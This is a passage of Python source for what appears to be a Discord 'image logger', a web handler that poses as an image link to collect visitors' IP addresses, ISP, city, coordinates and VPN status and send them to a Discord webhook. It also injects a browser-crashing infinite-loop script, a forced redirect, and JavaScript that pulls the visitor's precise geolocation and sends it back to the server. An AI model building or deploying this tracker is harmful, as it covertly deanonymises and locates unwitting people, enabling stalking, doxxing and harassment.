                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
